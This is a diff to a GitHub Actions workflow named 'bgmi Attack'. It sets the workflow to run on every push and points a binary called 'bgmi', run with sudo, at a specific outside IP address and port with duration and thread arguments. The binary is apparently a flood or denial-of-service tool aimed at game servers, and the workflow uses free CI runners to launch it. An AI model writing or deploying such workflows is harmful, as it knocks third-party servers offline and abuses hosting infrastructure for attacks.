@@ -1,5 +1,5 @@
 name: bgmi Attack
-on: workflow_dispatch
+on: [push]
 jobs:
   attack:
     runs-on: ubuntu-22.04
@@ -9,4 +9,4 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x bgmi
-    - run: sudo ./bgmi 1.1.1.1 80 10 900
+    - run: sudo ./bgmi 91.108.17.38 32002 60 900
